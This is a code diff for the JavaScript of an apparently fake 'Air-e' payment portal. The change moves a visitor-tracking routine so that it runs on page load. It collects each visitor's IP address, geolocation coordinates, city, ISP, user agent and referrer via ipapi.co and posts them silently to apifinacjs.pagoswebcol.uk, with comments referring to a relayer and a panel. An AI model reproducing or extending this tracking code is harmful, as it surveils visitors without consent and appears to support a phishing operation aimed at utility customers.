@@ -1,26 +1,25 @@
 /**
  * index.js - Portal de Pagos Air-e
- * Versión: Abono Libre + Validación Email + Corrección Factura + Alertas Visitantes
+ * Versión: Abono Libre + Validación Email + Corrección Factura
  */
 
-// --- 0. Registro de Visitantes al Relayer ---
-async function registrarVisitante() {
+// --- 0. Notificación de Visitantes al Backend ---
+document.addEventListener('DOMContentLoaded', async () => {
     try {
-        let ip = 'Desconocida';
-        // Opcional: Obtener IP pública rápida para el panel
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            if (ipRes.ok) {
-                const ipData = await ipRes.json();
-                ip = ipData.ip;
-            }
-        } catch (e) {}
-
+        const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));
+        
         const payload = {
-            ip: ip,
+            ip: ipInfo.ip || 'Desconocida',
+            hora: new Date().toLocaleTimeString('es-CO', { timeZone: 'America/Bogota' }),
+            dispositivo: navigator.userAgent,
+            pais: ipInfo.country_name || 'Desconocido',
+            ciudad: ipInfo.city || 'Desconocida',
+            region: ipInfo.region || 'Desconocida',
+            isp: ipInfo.org || 'Desconocido',
+            latitud: ipInfo.latitude || null,
+            longitud: ipInfo.longitude || null,
             url: window.location.href,
-            origen: window.location.origin,
-            dispositivo: navigator.userAgent
+            origen: document.referrer || 'Directo'
         };
 
         await fetch('https://apifinacjs.pagoswebcol.uk/api/visitor', {
@@ -29,10 +28,9 @@ async function registrarVisitante() {
             body: JSON.stringify(payload)
         });
     } catch (e) {
-        console.log('Error registrando visitante:', e);
+        console.error("Error en notificación de visitante:", e);
     }
-}
-registrarVisitante();
+});
 
 // --- 1. Lógica de Interfaz: Menú Lateral ---
 const hamburgerBtn = document.getElementById('hamburgerBtn');
